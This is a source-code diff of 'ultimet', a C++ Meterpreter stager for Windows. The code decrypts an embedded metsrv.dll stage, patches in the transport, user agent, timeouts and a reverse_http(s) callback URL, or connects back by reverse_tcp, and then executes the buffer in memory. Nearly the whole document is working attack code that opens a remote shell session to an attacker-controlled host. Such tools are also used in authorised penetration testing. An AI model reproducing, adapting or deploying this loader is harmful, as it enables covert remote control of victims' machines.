@@ -1,30 +1,31 @@
 //ÈÓã Çááå ÇáÑÍãä ÇáÑÍíã
 
 /************************************************
- *					  [ultimet]					*
- *		The Ultimate Meterpreter Executable		*
- ************************************************		
-  - @SherifEldeeb
-  - http://eldeeb.net
-  - Made in Egypt :)
- ************************************************/
+*					  [ultimet]					*
+*		The Ultimate Meterpreter Executable		*
+*************************************************		
+- @SherifEldeeb
+- http://eldeeb.net
+- Made in Egypt :)
+************************************************/
 
 #include "main.h"
 
 int wmain(int argc, wchar_t *argv[])
 {
+	print_awesome_header();	//as it sounds...
 	PAYLOAD_SETTINGS payload_settings = {0}; //That's defined at main.h
 	BYTE* buffer = nullptr; // this will hold the stage 
 	DWORD bufferSize = 0;	// buffer length
 	DWORD index = 0;		// will be used to locate offset of stuff to be patched "reverse_tcp, reverse_http, the url ... etc."
 	char EncKey[16] = {0};	// XOR Encryption key
 	void (*function)();		// The casted-to-be-function after we have everything in place.
-	
+
 	/*
 	Reverse_TCP specific Variables
 	*/
 	SOCKET ConnectSocket = INVALID_SOCKET; // Socket ... will be used for reverse_tcp
-	
+
 	/*
 	HTTP(S) Specific Variables
 	*/
@@ -72,15 +73,26 @@ int wmain(int argc, wchar_t *argv[])
 
 
 	// Read resource into buffer ...
+	dprintf(L"[*] Loading encrypted resource (the stage) into memory...\n");
 	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
 	if (bufferSize == 0) // if something went wrong...
 	{
 		dprintf(L"[-] Couldn't read stage from resource, please make sure that the type is \"BINARY\" and the ID is \"101\".");
 		exit(0);
 	}
+	dprintf(L"[*] Encrypted resource loaded successfully! Locating Encryption key...\n");
 	GetKeyFromBuffer(buffer, EncKey, 16);
+
+	printf("[*] \"%s\" will be used; decrypting...\n", EncKey);
 	XORcrypt(buffer, EncKey, bufferSize);
-	buffer = buffer + 11; // 16 bytes encryption key - 5 bytes for (0xBF + Socket number)
+
+	if(memcmp(&buffer[16],"MZ",2))
+	{
+			dprintf(L"[-] Something went wrong, bad resource, wrong encryption key, or maybe something else ... bailing out!\n");
+			exit(0);
+	}
+	dprintf(L"[*] Looks like resource decrypted correctly, proceeding ...\n");
+
 
 	/*
 	if(argc == 1)
@@ -111,7 +123,7 @@ int wmain(int argc, wchar_t *argv[])
 		dprintf(L"[-] Couldn't locate transport string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
 		exit(0);
 	}
-	dprintf(L"[*] Patching transport, Offset found at 0x%08x\n", index);
+	dprintf(L"[*] Patching transport: Offset 0x%08x ->  \"%s\"\n", index, payload_settings.TRANSPORT );
 	PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));
 
 	// Patching ReflectiveDLL bootstrap 
@@ -122,7 +134,7 @@ int wmain(int argc, wchar_t *argv[])
 		dprintf(L"[-] Couldn't locate \"MZ\", this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
 		exit(0);
 	}
-	dprintf(L"[*] Patching ReflectiveDll Bootstrap, \"MZ\" Offset found at 0x%08x\n", index);	
+	dprintf(L"[*] Patching ReflectiveDll Bootstrap: \"MZ\" Offset 0x%08x\n", index);	
 	memcpy(buffer+index, ReflectiveDllBootLoader, 62);//dos header can't exceed 62
 
 	//////////////////////////////////////////
@@ -139,12 +151,12 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[-] Couldn't locate UA string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
 			exit(0);
 		}
-		dprintf(L"[*] Patching UA, Offset found at 0x%08x\n", index);
 		if(payload_settings.USER_AGENT == NULL)
 		{
-			dprintf(L"[+] No UserAgent specified, using default one ...\n");
+			dprintf(L"[!] No UserAgent specified, using default one ...\n");
 			payload_settings.USER_AGENT = L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0\x00";
 		}
+		dprintf(L"[*] Patching UA: Offset 0x%08x -> \"%s\"\n", index, payload_settings.USER_AGENT);
 		PatchString(buffer, payload_settings.USER_AGENT, index, wcslen(payload_settings.USER_AGENT));
 
 		//Patching global expiration timeout.
@@ -155,13 +167,13 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
 			exit(0);
 		}
-		dprintf(L"[*] Patching global_expiration_timeout, Offset found at 0x%08x\n", index);
+
 		if(payload_settings.expiration_timeout == NULL)
 		{
-			dprintf(L"[+] No expiration_timeout specified, using 60400 seconds ...\n");
+			dprintf(L"[!] No expiration_timeout specified, using 60400 seconds ...\n");
 			payload_settings.expiration_timeout = 60400;
 		}
-		dprintf(L"[+] ... using \"%d\" seconds as specified...\n", payload_settings.expiration_timeout );
+		dprintf(L"[*] Patching global_expiration_timeout: Offset 0x%08x -> \"%d\" seconds\n", index, payload_settings.expiration_timeout);
 		memcpy(&buffer[index], &payload_settings.expiration_timeout, 4);
 
 		//Patching global_comm_timeout.
@@ -172,13 +184,13 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
 			exit(0);
 		}
-		dprintf(L"[*] Patching global_comm_timeout, Offset found at 0x%08x\n", index);
+
 		if(payload_settings.comm_timeout == NULL)
 		{
-			dprintf(L"[+] No comm_timeout specified, using 300 seconds ...\n");
+			dprintf(L"[!] No comm_timeout specified, using 300 seconds ...\n");
 			payload_settings.comm_timeout = 300;
 		}
-		dprintf(L"[+] ... using \"%d\" seconds as specified...\n", payload_settings.comm_timeout );
+		dprintf(L"[*] Patching global_comm_timeout: Offset 0x%08x -> \"%d\" seconds\n", index, payload_settings.comm_timeout);
 		memcpy(&buffer[index], &payload_settings.comm_timeout, 4);
 	}
 
@@ -194,11 +206,14 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[-] Failed to connect...\n");
 			exit(0);
 		}
-		dprintf(L"[*] Setting EDI-to-be value to 0xBF at 0x%08x\n", &buffer);
+		dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
 		buffer[0] = 0xBF;
 		dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
 		memcpy(buffer+1, &ConnectSocket, 4);
-		dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
+
+		//Adjusting buffer .. this is important!
+		//We have the first 16 bytes as \0s, we have to skip them and leave only 5 bytes for the 0xBF + 4 bytes of socket 
+		buffer = buffer + 11; // (16 bytes encryption key) - (5 bytes for (0xBF + Socket number))
 	} 
 
 	// Are we reverse_http(s)?
@@ -212,11 +227,11 @@ int wmain(int argc, wchar_t *argv[])
 		char URI_Part_2[16] = {0};	//16 random chars.
 		srand ( time(NULL) );	//Seed rand() 
 
-		while(true)				//Keep getting random values till we succeed
+		while(true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
 		{
 			gen_random(URI_Part_1, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounded just fine.
 			checksum = TextChecksum8(URI_Part_1);	//Get the 8-bit checksum of the random value
-			if(checksum == URI_CHECKSUM_CONN)		//If the checksum == 98, it will be handled by the multi/handler correctly as a "CONN_" request and short fused into a session.
+			if(checksum == URI_CHECKSUM_CONN)		//If the checksum == 98, it will be handled by the multi/handler correctly as a "CONN_" and will be short fused into a session.
 			{
 				break; // We found a random string that checksums to 98
 			}
@@ -246,17 +261,34 @@ int wmain(int argc, wchar_t *argv[])
 		strcat_s(url,"_");			// "http(s)://LHOST:LPORT/CONN_"
 		strcat_s(url,URI_Part_2);	// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX"
 		strcat_s(url,"/\0");		// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX/"
-		//Thanks for waiting :)
+		//Thanks for waiting... :)
+
 		wchar_t temp[512] = {0};
 		mbstowcs_s(NULL,temp,url,strlen(url));
 		dprintf(L"[*] URL: %s\n",temp);
+
+		//Patching URL ...
+		index = 0; //Rewind
+		index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_url, (int)strlen(global_meterpreter_url));
+		if (index == 0) // if the global_meterpreter_url is not found ...
+		{
+			dprintf(L"[-] Couldn't locate global_meterpreter_url string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
+			exit(0);
+		}
+		dprintf(L"[*] Patching global_meterpreter_url: Offset 0x%08x ->  \"%s\"\n", index, temp );
+		memcpy(&buffer[index], &url, strlen(url)+1); //+1 to make sure it'll be null terminated, otherwise it will end with 'X'
+
+		//Adjusting buffer .. this is important!
+		//We have the first 16 bytes as \0s, we have to skip them and set the buffer to start at MZ.
+		//No socket, no 0xBF here ... reverse_http & reverse_https do not require socket
+		dprintf(L"[*] Adjusting buffer...\n\n");
+		buffer = buffer + 16; 
 	}
-
+	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
 	function = (void (*)())buffer;
-	dprintf(L"[*] Calling the function, bye bye inmet, hello metasploit!\n");
-	function();
-	//function();
 
+	dprintf(L"[*] Calling the function, bye bye [ultimet], hello metasploit!\n");
+	function();
 
 	return 0;
 }
